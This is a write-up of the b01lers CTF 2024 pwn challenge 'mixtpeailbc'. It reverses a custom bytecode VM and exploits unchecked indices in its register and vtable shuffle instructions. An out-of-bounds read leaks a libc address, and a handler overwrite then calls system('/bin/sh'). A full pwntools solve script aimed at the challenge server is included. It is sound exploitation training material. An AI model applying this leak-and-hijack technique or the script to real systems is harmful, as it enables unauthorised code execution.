# mixtpeailbc

> Author: Athryx<br>
> Description: Can you make this bytecode vm execute real code? This challenge uses the same binary as mixtape.<br>
> Attachment: [mixtpeailbc.tar.gz](https://github.com/d0UBleW/ctf/raw/main/b01lers-24/pwn/mixtpeailbc/mixtpeailbc.tar.gz)

<div class="hidden">
    <details>
        <summary>Keywords</summary>
        b01lers CTF 2024, pwn, custom VM, oob
    </details>
</div>

## TL;DR

This VM contains instructions to swap instruction handler and registers where
the indices come from the VM bytecode memory referenced by the value of register
plus an offset without any bound checking. This vulnerability leads to OOB read
to leak libc address and eventually swap one of the instruction handler with user
controlled function.

## Reversing the VM

> [!NOTE]
> Snippet of the reversed VM source code can be viewed in the [appendix](#reversed-vm-source-code) section

The VM object is first allocated in the stack and its memory is divided into three logical parts:
- instruction handler table (39 entries, 0x138 bytes)
- registers (indexed from 0-255, 0x800 bytes)
- bytecode (0x8000 bytes)

The instructions is made up of 4 bytes, where:
- 1st byte is the index to the instruction handler table
- 2nd, 3rd, and 4th bytes are reserved for operand 1, operand 2, and operand 3

The operands could be either an immediate value or the index of the registers.

The only important register is the first register, `r0`, which acts as an instruction
pointer.

Here is the brief description of the instructions that may interest us:

> [!NOTE]
> the first argument refers to operand 1, the second argument refers to operand 2, and the third argument refers to operand 3
>
> `ropN` refers to operand `N`, where the value is used as the index of the registers (`vm.regs.rX[opN]`)

| instruction | description |
| --- | --- |
| `vm_next_insn()` | get the next instruction by adding 4 to `r0` |
| `vm_mov_r_mem(rop1, rop2, op3)` | `rop1 = (uint64_t)vm.bytecode[rop2+op3]` with bound checking |
| `vm_mov_mem_r(rop1, rop2, op3)` | `vm.bytecode[rop2+op3] = (uint64_t)rop1` with bound checking |
| `vm_rearrange_vtable(op3, rop2, op3)` | rearrange the vtable with indices stored from `vm.bytecode[rop2+op3]` to `vm.bytecode[rop2+op3+25]` without bound checking |
| `vm_rearrange_regs(op3, rop2, op3)` | rearrange `op1` number of registers with indices stored from `vm.bytecode[rop2+op3]` to `vm.bytecode[rop2+op3+op1-1]` without bound checking |
| `vm_set_r_16(rop1, op2)` | clears out all bits, then set bit 00-15 of `rop1` with 16-bit values spanning from `op2` to `op3` |
| `vm_set_r_32(rop1, op2)` | set bit 16-31 of `rop1` with 16-bit values spanning from `op2` to `op3` |
| `vm_set_r_48(rop1, op2)` | set bit 32-47 of `rop1` with 16-bit values spanning from `op2` to `op3` |
| `vm_set_r_64(rop1, op2)` | set bit 48-63 of `rop1` with 16-bit values spanning from `op2` to `op3` |
| `vm_set_r0(rop1, op2)` | set `r0` to `rop1` + 16-bit values spanning from `op2` to `op3` |
| `vm_putc(op1, rop2, op3)` | read `op1` bytes of value from `vm.bytecode[rop2+op3]` and print it to stdout, with bound checking |
| `vm_getc(op1, rop2, op3)` | write to `vm.bytecode[rop2+op3]` with `op1` bytes of input from stdin, with bound checking |
| `vm_movb_r_mem(rop1, rop2, op3)` | `rop1 = (uint8_t)vm.bytecode[rop2+op3]` with bound checking |
| `vm_setb_mem_r(rop1, rop2, op3)` | `vm.bytecode[rop2+op3] = (uint8_t)rop1` with bound checking |
| `vm_X_rop1_rop2_rop3` | `rop1 = rop2 X rop3`, where `X` is either `add`, `sub`, `mul`, `div`, `or`, `and`, `xor`, `shl` |
| `vm_X_rop1_rop2_op3` | `rop1 = rop2 X op3`, where `X` is either `add`, `sub`, `mul`, `div`, `or`, `and`, `xor`, `shl` |

As can be seen, most instruction has bound checking except for both `vm_rearrange_vtable` and `vm_rearrange_regs`.
Let us delve into both of these functions and see how we could leak and eventually hijack the control flow.

## Leaking libc address via `vm_rearrange_regs`

In this function, we are free to use any memory address relative to `vm.bytecode`
and use the values there as the indices for shuffling.

```c
unsigned __int64 __fastcall vm_rearrange_regs(s_vm *vm, unsigned int insn)
{
  unsigned __int8 op1; // [rsp+17h] [rbp-829h]
  unsigned __int64 i; // [rsp+18h] [rbp-828h]
  unsigned __int64 j; // [rsp+20h] [rbp-820h]
  unsigned __int8 *ptr; // [rsp+28h] [rbp-818h]
  __int64 saved_regs[256]; // [rsp+30h] [rbp-810h]
  unsigned __int64 canary; // [rsp+838h] [rbp-8h]

  canary = __readfsqword(0x28u);
  op1 = vm_get_op1(insn);
  // potential oob
  ptr = &vm->bytecode[vm_add_rop2_op3(vm, insn)];
  for ( i = 0LL; i <= 0xFF; ++i )
    saved_regs[i] = vm->regs.rX[i];
  for ( j = 0LL; j < op1; ++j )
    vm->regs.rX[j] = saved_regs[ptr[j]];
  _vm_next_insn(vm);
  return __readfsqword(0x28u) ^ canary;
}
```

Since the `vm` object is located on the stack, this means that there is a high
chance that the neighboring memory address contains valuable data, for instance,
libc addresses.

In general, the function `main()` would return to the middle of `__libc_start_main`,
which is part of the libc memory region. Coincidentally, `vm` lives inside `main()`
function stack frame, so we could calculate the distance easily.

```text
+---------------------+
| instruction handler |
|        table        |
+---------------------+
|      registers      |
+---------------------+
|      bytecode       |  bytecode[0] until bytecode[0x7fff]
+---------------------+
|       canary        |  bytecode[0x8000]
+---------------------+
|      saved rbp      |  bytecode[0x8008]
+---------------------+
|      saved rip      |  bytecode[0x8010] == __libc_start_main_ret
+---------------------+
```

Now, let's observe how we could leak stuff with this instruction.

```text
vm_rearrange_regs(8, 0x10, 0x00)

vm.bytecode[0x10] = A
vm.bytecode[0x11] = B
vm.bytecode[0x12] = C
vm.bytecode[0x13] = D
vm.bytecode[0x14] = E
vm.bytecode[0x15] = F
vm.bytecode[0x16] = G
vm.bytecode[0x17] = H
```

The instruction above would modify `r0` through `r7` and results in

```text
r0 = rA
r1 = rB
r2 = rC
r3 = rD
r4 = rE
r5 = rF
r6 = rG
r7 = rH
```

However, notice that the value of `rA`, `rB`, `rC`, etc., may not correlate
directly with the value that we wanted to leak, unless we set each registers
with the value of its index (luckily, we just have the perfect number of registers, 256,
to correlate with a one byte value, how coincidental!).

```text
r1 = 1
r2 = 2
r3 = 3
r4 = 4
r5 = 5
...
r252 = 252
r253 = 253
r254 = 254
r255 = 255
```

As a result, our `r0` - `r7` would just contain the leak value itself.

Next, notice that each 8-bit value of the 64-bit value that we want to leak ends up
in different registers. We could concatenate these registers into a single
register like this

```text
xor r8, r8, r8
shl r8, r8, 0x8
add r8, r8, r7
shl r8, r8, 0x8
add r8, r8, r6
shl r8, r8, 0x8
add r8, r8, r5
shl r8, r8, 0x8
add r8, r8, r4
shl r8, r8, 0x8
add r8, r8, r3
shl r8, r8, 0x8
add r8, r8, r2
shl r8, r8, 0x8
add r8, r8, r1
```

Now, `r8` is exactly the value that we want to leak. One last caveat is that
we changed `r0` which means that we need to carefully crafts our bytecode such
that it continues execution as expected. Since size of bytecode requires to
setup from `r1` to `r255` is already larger than `0x100` and our `r0` might end
up somewhere in between `0x00` and `0xff`, we need this setup code to be located
above `0x100`, e.g., at offset `0x400`. And to reach this piece of code, we
would need to use `vm_set_r0` to set our `r0` accordingly. Finally, we would
want to continue writing our code at `r0 + 4` after the shuffle has happened.

```py
# $ pwn libcdb file ./libc.so.6
__libc_start_main_ret = 0x24083

bytecode = b""
# jump to insn @ 0x400 to leak libc
bytecode += VM_SET_R0(0x10, 0x400)

bytecode = bytecode.ljust((__libc_start_main_ret & 0xff) + 4, b"\x00")

# bytecode continuation after executing vm_rearrange_regs
bytecode += VM_EXIT()

# bytecode to leak libc
bytecode = bytecode.ljust(0x400, b"\x00")
# sets each registers value to its own index value
for i in range(1, 256):
    bytecode += VM_SET_R_16(i, i)
# oob read @ bytecode[0x8010] == __libc_start_main_ret
# set r10 = 0x8010
bytecode += VM_SET_R_16(0x10, 0x8010)
# __libc_start_main_ret bytes goes into r0, r1, r2, r3, r4, r5, r6
# __libc_start_main_ret is 0x24083, so r0 changes to 0x83 and after shuffle
# the next instruction to be executed is at 0x83 + 0x4 = 0x87
bytecode += VM_SHUFFLE_REGS(6, 0x10, 0)
```

## Control Flow Hijacking via `vm_rearrange_vtable`

Similar to `vm_rearrange_regs`, we are free to use any memory address relative
to `vm.bytecode` to modify our instruction handler table. However, we are not
going to use this oob. Instead, we would use `saved_vtable[idx]` as our oob
vector to copy values from `vm.regs`.

> [!NOTE]
> This does not work previously on `vm_rearrange_regs` since the size of
> `saved_regs` is just in the range of `idx` (`0x00` - `0xff`).

```c
unsigned __int64 __fastcall vm_rearrange_vtable(s_vm *vm, unsigned int insn)
{
  unsigned __int64 i; // [rsp+18h] [rbp-158h]
  unsigned __int64 j; // [rsp+20h] [rbp-150h]
  unsigned __int8 *ptr; // [rsp+28h] [rbp-148h]
  __int64 saved_vtable[39]; // [rsp+30h] [rbp-140h]
  unsigned __int64 canary; // [rsp+168h] [rbp-8h]

  canary = __readfsqword(0x28u);
  // potential oob
  ptr = &vm->bytecode[vm_add_rop2_op3(vm, insn)];
  for ( i = 0LL; i <= 0x26; ++i )
    saved_vtable[i] = vm->vtable[i];
  for ( j = 0LL; j <= 0x26; ++j )
    vm->vtable[j] = saved_vtable[ptr[j]];
  _vm_next_insn(vm);
  return __readfsqword(0x28u) ^ canary;
}
```

Since the `idx` in `saved_vtable[idx]` is an 8-bit value, we need to find
neighboring memory address that we could fully control.

```text
+---------------------+
|     saved_vtable    |
+---------------------+
|         ...         |
+---------------------+
| instruction handler |
|        table        |
+---------------------+
|      registers      |
+---------------------+
```

Fortunately, with an 8-bit `idx`, we are able to reach the memory region of our
`vm.regs` in which we can populate with any value that we want.
Now, we just need to setup the value we want to overwrite our instruction handler
with, on one of the registers.

Looking at the line of code which calls the instruction handler, we could see
that we have control over the first and second arguments.

```c
    ((void (__fastcall *)(s_vm *, _QWORD))vm->vtable[v1])(vm, insn);
```

- Option 1: `system("/bin/sh")`

  Since `vm` == `&vm.vtable[0]`, if we overwrite `vm.vtable[0]` with the string
  of `/bin/sh` and overwrite `vm.vtable[1]` with `system` function address,
  this would just end up calling `system("/bin/sh")`

- Option 2: `one_gadget`

  Another way to pop a shell is to use this `one_gadget`.

  ```text
  0xe3b04 execve("/bin/sh", rsi, rdx)
  constraints:
    [rsi] == NULL || rsi == NULL
    [rdx] == NULL || rdx == NULL
  ```

```py
# $ pwn libcdb file ./libc.so.6
__libc_start_main_ret = 0x24083

bytecode = b""
# jump to insn @ 0x400 to leak libc
bytecode += VM_SET_R0(0x10, 0x400)

bytecode = bytecode.ljust((__libc_start_main_ret & 0xff) + 4, b"\x00")

# bytecode continuation after executing vm_rearrange_regs
for i in range(1, 6):
    bytecode += VM_AND_R_R_IMM(i, i, 0xFF)

# combine everything into one register r10
bytecode += VM_XOR_R_R_R(0x10, 0x10, 0x10)
for i in range(1, 6):
    bytecode += VM_SHL_R_R_IMM(0x10, 0x10, 0x8)
    bytecode += VM_ADD_R_R_R(0x10, 0x10, 6 - i)
bytecode += VM_SHL_R_R_IMM(0x10, 0x10, 0x8)

# set __libc_start_main_ret offset to r11
bytecode += VM_SET_R_16(0x11, 0x4000)
bytecode += VM_SET_R_32(0x11, 0x2)
bytecode += VM_SUB_R_R_R(0x10, 0x10, 0x11)
# now r10 = libc base address

system = libc.sym["system"]

bytecode += VM_XOR_R_R_R(0x15, 0x15, 0x15)
# set system function offset to r15
bytecode += VM_SET_R_16(0x15, system & 0xFFFF)
bytecode += VM_SET_R_32(0x15, (system >> 16) & 0xFFFF)
bytecode += VM_XOR_R_R_R(0x13, 0x13, 0x13)
bytecode += VM_ADD_R_R_R(0x13, 0x10, 0x15)

# set /bin/sh string to r14
bytecode += VM_XOR_R_R_R(0x14, 0x14, 0x14)
bytecode += VM_SET_R_16(0x14, u16(b"/b"))
bytecode += VM_SET_R_32(0x14, u16(b"in"))
bytecode += VM_SET_R_48(0x14, u16(b"/s"))
bytecode += VM_SET_R_64(0x14, u16(b"h\x00"))

# write 0x6f @ bytecode[0x4000]
# write 0x6e @ bytecode[0x4001]
bytecode += VM_XOR_R_R_R(0x11, 0x11, 0x11)
bytecode += VM_SET_R_16(0x11, 0x4000)
bytecode += VM_SET_R_16(0x12, 0x6F)
bytecode += VM_SETB_MEM_R(0x12, 0x11, 0x00)
bytecode += VM_SET_R_16(0x12, 0x6E)
bytecode += VM_SETB_MEM_R(0x12, 0x11, 0x01)
# shuffle vtable where vm->vtable[0] = vtable[0x6f] which contains
# "/bin/sh" string and vm->vtable[1] = vtable[0x6e] which contains
# system function address
bytecode += VM_SHUFFLE_VTABLES(0x2, 0x11, 0x00)

# call system
bytecode += VM_MOV_R_MEM(0, 0, 0)
bytecode += VM_EXIT()

# bytecode to leak libc
bytecode = bytecode.ljust(0x400, b"\x00")
# sets each registers value to its own index value
for i in range(1, 256):
    bytecode += VM_SET_R_16(i, i)
# oob read @ bytecode[0x8010] == __libc_start_main_ret
# set r10 = 0x8010
bytecode += VM_SET_R_16(0x10, 0x8010)
# __libc_start_main_ret bytes goes into r0, r1, r2, r3, r4, r5, r6
# __libc_start_main_ret is 0x24083, so r0 changes to 0x83 and after shuffle
# the next instruction to be executed is at 0x83 + 0x4 = 0x87
bytecode += VM_SHUFFLE_REGS(6, 0x10, 0)
```

## Final Solve Script

```py
#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import tempfile
from base64 import b64encode

from pwn import *

elf = context.binary = ELF("./mixtape", checksec=False)
libc = elf.libc
context.terminal = ["tmux", "neww"]


def VM_NEXT_INSN(op1=0, op2=0, op3=0):
    return p8(0) + p8(op1) + p8(op2) + p8(op3)


def VM_MOV_R_MEM(r_dest, r_base, offset):
    """
    mov r_op1, mem[r_op2+op3]
    """
    return p8(1) + p8(r_dest) + p8(r_base) + p8(offset)


def VM_MOV_MEM_R(r_src, r_base, offset):
    """
    mov r_op1, mem[r_op2+op3]
    """
    return p8(2) + p8(r_src) + p8(r_base) + p8(offset)


def VM_SHUFFLE_VTABLES(op1, r_op2, op3):
    return p8(3) + p8(op1) + p8(r_op2) + p8(op3)


def VM_SHUFFLE_REGS(op1, r_op2, op3):
    """
    op1 = number of regs
    """
    return p8(4) + p8(op1) + p8(r_op2) + p8(op3)


def VM_EXIT(op1=0, op2=0, op3=0):
    """
    exit
    """
    return p8(5) + p8(op1) + p8(op2) + p8(op3)


def VM_SET_R_16(r_dest, imm):
    """
    set lowest 16-bit
    """
    return p8(6) + p8(r_dest) + p16(imm)


def VM_SET_R_32(r_dest, imm):
    """
    or r_op1, op2 << 16
    set bit 16 to 31
    """
    return p8(7) + p8(r_dest) + p16(imm)


def VM_SET_R_48(r_dest, imm):
    """
    or r_op1, op2 << 32
    set bit 32 to 47
    """
    return p8(8) + p8(r_dest) + p16(imm)


def VM_SET_R_64(r_dest, imm):
    """
    or r_op1, op2 << 48
    set bit 48 to 63
    """
    return p8(9) + p8(r_dest) + p16(imm)


def VM_CMP_R_R(r_dest, r_op2, r_op3):
    """
    if r_op2 == r_op3 then r_dest = 1
    if r_op2 < r_op3 then r_dest = 2
    else r_dest = 0
    """
    return p8(10) + p8(r_dest) + p8(r_op2) + p8(r_op3)


def VM_CMP_R_IMM(r_dest, r_op2, imm):
    """
    if r_op2 == imm then r_dest = 1
    if r_op2 < imm then r_dest = 2
    else r_dest = 0
    """
    return p8(11) + p8(r_dest) + p8(r_op2) + p8(imm)


def VM_SET_R0(r_op1, imm):
    """
    lea r0, [r_op1+imm]
    """
    return p8(12) + p8(r_op1) + p16(imm)


def VM_ADD_R_R_R(r_dest, r_op2, r_op3):
    return p8(19) + p8(r_dest) + p8(r_op2) + p8(r_op3)


def VM_ADD_R_R_IMM(r_dest, r_op2, op3):
    return p8(20) + p8(r_dest) + p8(r_op2) + p8(op3)


def VM_SUB_R_R_R(r_dest, r_op2, r_op3):
    return p8(21) + p8(r_dest) + p8(r_op2) + p8(r_op3)


def VM_SUB_R_R_IMM(r_dest, r_op2, op3):
    return p8(22) + p8(r_dest) + p8(r_op2) + p8(op3)


def VM_AND_R_R_IMM(r_dest, r_op2, op3):
    return p8(30) + p8(r_dest) + p8(r_op2) + p8(op3)


def VM_XOR_R_R_R(r_dest, r_op2, r_op3):
    return p8(31) + p8(r_dest) + p8(r_op2) + p8(r_op3)


def VM_PUTC(op1, r_op2, op3):
    return p8(33) + p8(op1) + p8(r_op2) + p8(op3)


def VM_GETC(op1, r_op2, op3):
    return p8(34) + p8(op1) + p8(r_op2) + p8(op3)


def VM_SETB_MEM_R(r_op1, r_op2, op3):
    return p8(36) + p8(r_op1) + p8(r_op2) + p8(op3)


def VM_SHL_R_R_IMM(r_dest, r_op2, op3):
    return p8(38) + p8(r_dest) + p8(r_op2) + p8(op3)


def start(argv=[], *a, **kw):
    nc = "nc gold.b01le.rs 4003"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(args=args_, env=env, gdbscript=gdbscript)
        return process(args_, env=env, *a, **kw)


env = {}
gdbscript = """
source ~/.gdbinit-gef-bata24.py
b *exec_vm
# b *exec_vm+0x71
b *vm_rearrange_vtable+87
tb *vm_rearrange_regs
c  # exec_vm
memory watch $rdi+0x138 0x100 qword
memory watch $rdi+0x938 0x100 dword
c
# b *exec_vm+0x71
"""

# $ pwn libcdb file ./libc.so.6
__libc_start_main_ret = 0x24083

bytecode = b""

# jump to insn @ 0x400 to leak libc
bytecode += VM_SET_R0(0x10, 0x400)

# writing insn @ 0x83+0x4 = 0x87
bytecode = bytecode.ljust((__libc_start_main_ret & 0xFF) + 4, b"\x00")
for i in range(1, 6):
    bytecode += VM_AND_R_R_IMM(i, i, 0xFF)

# combine everything into one register r10
bytecode += VM_XOR_R_R_R(0x10, 0x10, 0x10)
for i in range(1, 6):
    bytecode += VM_SHL_R_R_IMM(0x10, 0x10, 0x8)
    bytecode += VM_ADD_R_R_R(0x10, 0x10, 6 - i)
bytecode += VM_SHL_R_R_IMM(0x10, 0x10, 0x8)

# set __libc_start_main_ret offset to r11
bytecode += VM_SET_R_16(0x11, 0x4000)
bytecode += VM_SET_R_32(0x11, 0x2)
bytecode += VM_SUB_R_R_R(0x10, 0x10, 0x11)
# now r10 = libc base address

system = libc.sym["system"]

bytecode += VM_XOR_R_R_R(0x15, 0x15, 0x15)
# set system function offset to r15
bytecode += VM_SET_R_16(0x15, system & 0xFFFF)
bytecode += VM_SET_R_32(0x15, (system >> 16) & 0xFFFF)
bytecode += VM_XOR_R_R_R(0x13, 0x13, 0x13)
bytecode += VM_ADD_R_R_R(0x13, 0x10, 0x15)

# set /bin/sh string to r14
bytecode += VM_XOR_R_R_R(0x14, 0x14, 0x14)
bytecode += VM_SET_R_16(0x14, u16(b"/b"))
bytecode += VM_SET_R_32(0x14, u16(b"in"))
bytecode += VM_SET_R_48(0x14, u16(b"/s"))
bytecode += VM_SET_R_64(0x14, u16(b"h\x00"))

# write 0x6f @ bytecode[0x4000]
# write 0x6e @ bytecode[0x4001]
bytecode += VM_XOR_R_R_R(0x11, 0x11, 0x11)
bytecode += VM_SET_R_16(0x11, 0x4000)
bytecode += VM_SET_R_16(0x12, 0x6F)
bytecode += VM_SETB_MEM_R(0x12, 0x11, 0x00)
bytecode += VM_SET_R_16(0x12, 0x6E)
bytecode += VM_SETB_MEM_R(0x12, 0x11, 0x01)
# shuffle vtable where vm->vtable[0] = vtable[0x6f] which contains
# /bin/sh string address and vm->vtable[1] = vtable[0x6e] which contains
# system function address
bytecode += VM_SHUFFLE_VTABLES(0x2, 0x11, 0x00)

# call system
bytecode += VM_MOV_R_MEM(0, 0, 0)
bytecode += VM_EXIT()

bytecode = bytecode.ljust(0x400, b"\x00")
for i in range(1, 256):
    bytecode += VM_SET_R_16(i, i)
# oob read @ bytecode[0x8010] == __libc_start_main_ret
bytecode += VM_SET_R_16(0x10, 0x8010)
# __libc_start_main_ret bytes goes into r0, r1, r2, r3, r4, r5, r6
# r0 is now the least significant byte of __libc_start_main_ret
# so after shuffle, we execute insn at LSB + 0x4
bytecode += VM_SHUFFLE_REGS(6, 0x10, 0)

with tempfile.NamedTemporaryFile("wb") as f:
    f.write(bytecode)
    f.flush()

    io = start(argv=[f.name])
    if args.REMOTE:
        io.sendlineafter(b">> ", b64encode(bytecode))

    io.interactive()
```

## Appendix

### Reversed VM Source Code

```c
typedef struct vm_regs
{
  __int64 rX[256];
} vm_regs;

typedef struct s_vm
{
  __int64 vtable[39];
  vm_regs regs;
  unsigned __int8 bytecode[32768];
} s_vm;

__int64 __fastcall main(int argc, char **argv, char **envp)
{
  char *s1; // [rsp+10h] [rbp-8950h]
  FILE *stream; // [rsp+18h] [rbp-8948h]
  s_vm vm; // [rsp+20h] [rbp-8940h] BYREF
  unsigned __int64 canary; // [rsp+8958h] [rbp-8h]

  canary = __readfsqword(0x28u);
  setup();
  if ( argc == 2 )
  {
    s1 = argv[1];
    if ( !strcmp(s1, "-h") || !strcmp(s1, "--help") )
    {
      usage();
      return 0LL;
    }
    else
    {
      stream = fopen(s1, "r");
      if ( stream )
      {
        init_vm(&vm);
        fread(vm.bytecode, 1uLL, 32768uLL, stream);
        fclose(stream);
        exec_vm(&vm);
      }
      printf("error: could not open bytecode file `%s`\n", s1);
      return 1LL;
    }
  }
  else
  {
    usage();
    return 1LL;
  }
}

void __fastcall __noreturn exec_vm(s_vm *vm)
{
  unsigned __int8 v1; // [rsp+1Bh] [rbp-5h]
  unsigned int insn; // [rsp+1Ch] [rbp-4h]

  while ( 1 )
  {
    insn = vm_get_insn(vm, vm->regs.rX[0]);
    v1 = get_idx(insn);
    if ( v1 > 38u )
      break;
    ((void (__fastcall *)(s_vm *, _QWORD))vm->vtable[v1])(vm, insn);
  }
  puts("error: invalid opcode");
  exit(1);
}

void __fastcall init_vm(void *dest)
{
  int i; // [rsp+14h] [rbp-8944h]
  s_vm vtable; // [rsp+18h] [rbp-8940h] BYREF
  unsigned __int64 canary; // [rsp+8950h] [rbp-8h]

  canary = __readfsqword(0x28u);
  vtable.vtable[0] = (__int64)vm_next_insn;
  vtable.vtable[1] = (__int64)vm_mov_r_mem;
  vtable.vtable[2] = (__int64)vm_mov_mem_r;
  vtable.vtable[3] = (__int64)vm_rearrange_vtable;
  vtable.vtable[4] = (__int64)vm_rearrange_regs;
  vtable.vtable[5] = (__int64)vm_exit;
  vtable.vtable[6] = (__int64)vm_set_r_16;
  vtable.vtable[7] = (__int64)vm_set_r_32;
  vtable.vtable[8] = (__int64)vm_set_r_48;
  vtable.vtable[9] = (__int64)vm_set_r_64;
  vtable.vtable[10] = (__int64)vm_cmp_r_r;
  vtable.vtable[11] = (__int64)vm_cmp_r_imm;
  vtable.vtable[12] = (__int64)vm_set_r0;
  vtable.vtable[13] = (__int64)vm_jnz;
  vtable.vtable[14] = (__int64)vm_jz;
  vtable.vtable[15] = (__int64)vm_jz_;
  vtable.vtable[16] = (__int64)vm_je2;
  vtable.vtable[17] = (__int64)vm_jne2;
  vtable.vtable[18] = (__int64)vm_jnz_;
  vtable.vtable[19] = (__int64)vm_add_rop1_rop2_rop3;
  vtable.vtable[20] = (__int64)vm_add_rop1_rop2_op3;
  vtable.vtable[21] = (__int64)vm_sub_rop1_rop2_rop3;
  vtable.vtable[22] = (__int64)vm_sub_rop1_rop2_op3;
  vtable.vtable[23] = (__int64)vm_mul_rop1_rop2_rop3;
  vtable.vtable[24] = (__int64)vm_mul_rop1_rop2_op3;
  vtable.vtable[25] = (__int64)vm_div_rop1_rop2_rop3;
  vtable.vtable[26] = (__int64)vm_div_rop1_rop2_op3;
  vtable.vtable[27] = (__int64)vm_or_rop1_rop2_rop3;
  vtable.vtable[28] = (__int64)vm_or_rop1_rop2_op3;
  vtable.vtable[29] = (__int64)vm_and_rop1_rop2_rop3;
  vtable.vtable[30] = (__int64)vm_and_rop1_rop2_op3;
  vtable.vtable[31] = (__int64)vm_xor_rop1_rop2_rop3;
  vtable.vtable[32] = (__int64)vm_xor_rop1_rop2_op3;
  vtable.vtable[33] = (__int64)vm_putc;
  vtable.vtable[34] = (__int64)vm_getc;
  vtable.vtable[35] = (__int64)vm_movb_r_mem;
  vtable.vtable[36] = (__int64)vm_setb_mem_r;
  vtable.vtable[37] = (__int64)vm_shl_rop1_rop2_rop3;
  vtable.vtable[38] = (__int64)vm_shl_rop1_rop2_op3;
  for ( i = 0; i <= 255; ++i )
    vtable.regs.rX[i] = 0LL;
  memset(vtable.bytecode, 0, sizeof(vtable.bytecode));
  memcpy(dest, &vtable, 0x8938uLL);
}

__int64 __fastcall vm_get_insn(s_vm *vm, __int64 r0)
{
  // potential oob access when r0 = -4
  if ( (unsigned __int64)(r0 + 4) > 0x7FFF )
    vm_oob_err();
  return (vm->bytecode[r0 + 2] << 16) | (vm->bytecode[r0 + 1] << 8) | vm->bytecode[r0] | (vm->bytecode[r0 + 3] << 24);
}

void __fastcall _vm_next_insn(s_vm *vm)
{
  vm->regs.rX[0] += 4LL;
}

unsigned __int64 __fastcall vm_rearrange_vtable(s_vm *vm, unsigned int insn)
{
  unsigned __int64 i; // [rsp+18h] [rbp-158h]
  unsigned __int64 j; // [rsp+20h] [rbp-150h]
  unsigned __int8 *ptr; // [rsp+28h] [rbp-148h]
  __int64 saved_vtable[39]; // [rsp+30h] [rbp-140h]
  unsigned __int64 canary; // [rsp+168h] [rbp-8h]

  canary = __readfsqword(0x28u);
  // potential oob
  ptr = &vm->bytecode[vm_add_rop2_op3(vm, insn)];
  for ( i = 0LL; i <= 0x26; ++i )
    saved_vtable[i] = vm->vtable[i];
  for ( j = 0LL; j <= 0x26; ++j )
    vm->vtable[j] = saved_vtable[ptr[j]];
  _vm_next_insn(vm);
  return __readfsqword(0x28u) ^ canary;
}

unsigned __int64 __fastcall vm_rearrange_regs(s_vm *vm, unsigned int insn)
{
  unsigned __int8 op1; // [rsp+17h] [rbp-829h]
  unsigned __int64 i; // [rsp+18h] [rbp-828h]
  unsigned __int64 j; // [rsp+20h] [rbp-820h]
  unsigned __int8 *ptr; // [rsp+28h] [rbp-818h]
  __int64 saved_regs[256]; // [rsp+30h] [rbp-810h]
  unsigned __int64 canary; // [rsp+838h] [rbp-8h]

  canary = __readfsqword(0x28u);
  op1 = vm_get_op1(insn);
  // potential oob
  ptr = &vm->bytecode[vm_add_rop2_op3(vm, insn)];
  for ( i = 0LL; i <= 0xFF; ++i )
    saved_regs[i] = vm->regs.rX[i];
  for ( j = 0LL; j < op1; ++j )
    vm->regs.rX[j] = saved_regs[ptr[j]];
  _vm_next_insn(vm);
  return __readfsqword(0x28u) ^ canary;
}
```
